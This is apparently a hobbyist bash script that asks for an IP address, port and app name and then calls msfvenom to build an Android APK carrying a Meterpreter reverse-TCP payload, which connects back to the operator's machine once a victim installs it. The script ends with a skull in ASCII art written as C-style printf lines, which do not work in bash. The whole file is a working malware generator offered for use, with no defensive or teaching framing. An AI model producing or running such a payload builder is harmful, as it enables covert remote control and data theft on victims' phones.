#!/bin/bash
echo "hello!"
echo "Please Enter Your Ip address"
read ip
echo "If u dont know your ip just type in your terminal (ifconfig) and it will show, your own IP"
echo "Please Enter The Port Number"
read port
echo "Please Enter The APK's name U want to display"
read name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> $name.apk
echo "know U have Your apk"
echo "Have a nice day"
ls
printf("         _,.-------.,_");
printf("     ,;~'             '~;,");
printf("   ,;                     ;,");
printf("  ;                         ;");
printf(" ,'                         ',");
printf(",;                           ;,");
printf("; ;      .           .      ; ;");
printf("| ;   ______       ______   ; |");
printf("|  `/~"     ~" . "~     "~\'  |");
printf("|  ~  ,-~~~^~, | ,~^~~~-,  ~  |");
printf(" |   |        }:{        |   |");
printf(" |   l       / | \       !   |");
printf(" .~  (__,.--" .^. "--.,__)  ~.");
printf(" |     ---;' / | \ `;---     |");
printf("  \__.       \/^\/       .__/");
printf("   V| \                 / |V");
printf("    | |T~\___!___!___/~T| |");
printf("    | |`IIII_I_I_I_IIII'| |");
printf("    |  \,III I I I III,/  |");
printf("     \   `~~~~~~~~~~'    /");
printf("       \   .       .   /");
printf("         \.    ^    ./");
printf("           ^~~~^~~~^");



